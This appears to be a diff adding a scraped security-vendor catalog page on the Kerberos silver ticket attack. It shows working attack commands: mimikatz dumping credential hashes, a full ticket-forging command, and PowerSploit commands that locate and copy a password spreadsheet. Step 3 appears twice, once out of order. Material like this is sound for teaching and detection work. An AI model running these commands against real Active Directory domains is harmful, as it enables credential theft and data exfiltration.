@@ -1,3 +1,170 @@
+
+Attack Catalog
+Adversary techniques for credential theft and data compromise
+
+
+<br>
+<br>
+https://attack.stealthbits.com/silver-ticket-attack-forged-service-tickets
+<br>
+<br>
+
+Silver Ticket
+Active Directory Credential Access Credential Theft Kerberos
+Similar in concept to a golden ticket, a silver ticket attack involves compromising credentials and abusing the design of the Kerberos protocol. However, unlike a golden ticket — which grants an adversary unfettered access to the domain — a silver ticket only allows an attacker for forge ticket-granting service (TGS) tickets for specific services. TGS tickets are encrypted with the password hash for the service – therefore, if an adversary steals the hash for a service account they can mint TGS tickets for that service.
+
+While its scope may be smaller, it is still a powerful tool in an adversary’s kit, enabling persistent and stealthy access to resources. Since only the service account’s password hash is required, it is also significantly easier to execute than a golden ticket. Techniques like harvesting hashes from LSASS.exe and Kerberoasting are common ways adversaries obtain service account password hashes.
+
+Threat Summary
+Target:
+
+Active Directory
+
+Tools:
+
+mimikatz, Impacket
+
+ATT&CK® Tactic:
+
+Credential Access
+
+ATT&CK Technique:
+
+T1558.002
+
+Difficulty
+Detect:
+
+Hard
+
+Mitigate:
+
+Hard
+
+Respond:
+
+Medium
+
+How Silver Ticket Works
+Hover to see each step
+
+
+In Silver Ticket, an attacker...
+
+
+Compromise service account credentials
+
+
+Forges Kerberos TGS tickets
+
+
+Uses forged tickets to further objectives
+
+
+Step 3: In the previous step, the adversary forged a silver ticket and injected it into a new cmd.exe session. The silver ticket the attacker minted specified the cifs service, which will allow the attacker to use the forged TGS to access file shares. Because the TGS is forged, it can be created for a user that does not actually exist in the domain making it harder for responders to track the adversary.
+
+In this example, the adversary uses the forged ticket and the Find-InterestingFile cmdlet, provided by the PowerShell module PowerSploit, to scan the file share for and exfiltrate sensitive data.
+
+Console
+PS> Find-InterestingFile -Path \\FileServer1.domain.com\S$\shares\
+ 
+ 
+FullName       : \\FileServer1.domain.com\S$\shares\IT\Service Account Passwords.xlsx
+Owner          : DOMAIN\JOED
+LastAccessTime : 27/07/2020 12:47:44
+LastWriteTime  : 27/07/2020 12:47:44
+CreationTime   : 10/04/2011 10:04:50
+Length         : 76859
+ 
+PS> Copy-Item -Path "\\FileServer1.domain.com\S$\shares\IT\Service Account Passwords.xlsx" -Destination "C:\Windows\Temp\a20ds3"
+PS>
+
+
+Step 1: To gain the ability to mint TGS tickets, an adversary must first compromise the password hash of a service account. In this example, an adversary has compromised a file server but wishes to gain persistent and stealthy access. They begin the process of creating silver tickets by compromising the necessary password hash.
+
+Console
+PS> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+ 
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+ 
+mimikatz(commandline) # sekurlsa::logonpasswords
+# ... output truncated ... #
+Authentication Id : 0 ; 29151002 (00000000:01bccf1a)
+Session           : Interactive from 5
+User Name         : DWM-5
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 21/07/2020 10:26:16
+SID               : S-1-5-90-0-5
+        msv :
+         [00000003] Primary
+         * Username : FileServer1$
+         * Domain   : DOMAIN
+         * NTLM     : 281fd98680ed31a9212256ada413db50
+         * SHA1     : c8fe518dfa728eb92eb2566328f0123e3bcb2717
+# ... output truncated ... #
+ 
+mimikatz(commandline) # exit
+Bye!
+
+Step 2: Tools like mimikatz can be used to mint silver tickets. The process for forging TGS tickets is similar to minting golden tickets, and with mimikatz uses the same kerberos::golden method, specifying the password hash of the service account instead of the krbtgt:
+
+/domain – The fully qualified domain name of the Active Directory domain
+/sid – The SID of the Active Directory domain
+/user – The username to impersonate
+/target – The fully qualified domain name of the server
+/service – The target service name
+/rc4 – The NTLM/RC4 password hash
+Console
+PS> .\mimikatz.exe "kerberos::golden /user:NonExistentUser /domain:domain.com /sid:S-1-5-21-5840559-2756745051-1363507867 /rc4:8fbe632c51039f92c21bcef456b31f2b /target:FileServer1.domain.com /service:cifs /ptt" "misc::cmd" exit
+ 
+mimikatz(commandline) # kerberos::golden /user:NonExistentUser /domain:domain.com /sid:S-1-5-21-5840559-2756745051-1363507867 /rc4:8fbe632c51039f92c21bcef456b31f2b /target:FileServer1.domain.com /service:cifs /ptt
+User      : NonExistentUser
+Domain    : domain.com (DOMAIN)
+SID       : S-1-5-21-5840559-2756745051-1363507867
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 8fbe632c51039f92c21bcef456b31f2b - rc4_hmac_nt
+Service   : cifs
+Target    : FileServer1.domain.com
+Lifetime  : 27/07/2020 12:20:26 ; 25/07/2030 12:20:26 ; 25/07/2030 12:20:26
+-> Ticket : ** Pass The Ticket **
+ 
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+ 
+Golden ticket for 'NonExistentUser @ domain.com' successfully submitted for current session
+ 
+mimikatz(commandline) # misc::cmd
+Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF7767043B8
+ 
+mimikatz(commandline) # exit
+Bye!
+
+Step 3: In the previous step, the adversary forged a silver ticket and injected it into a new cmd.exe session. The silver ticket the attacker minted specified the cifs service, which will allow the attacker to use the forged TGS to access file shares. Because the TGS is forged, it can be created for a user that does not actually exist in the domain making it harder for responders to track the adversary.
+
+In this example, the adversary uses the forged ticket and the Find-InterestingFile cmdlet, provided by the PowerShell module PowerSploit, to scan the file share for and exfiltrate sensitive data.
+
+Console
+PS> Find-InterestingFile -Path \\FileServer1.domain.com\S$\shares\
+ 
+ 
+FullName       : \\FileServer1.domain.com\S$\shares\IT\Service Account Passwords.xlsx
+Owner          : DOMAIN\JOED
+LastAccessTime : 27/07/2020 12:47:44
+LastWriteTime  : 27/07/2020 12:47:44
+CreationTime   : 10/04/2011 10:04:50
+Length         : 76859
+ 
+PS> Copy-Item -Path "\\FileServer1.domain.com\S$\shares\IT\Service Account Passwords.xlsx" -Destination "C:\Windows\Temp\a20ds3"
+PS>
+
+#####################################################
+
 # Silver Ticket
 
 ## Silver ticket
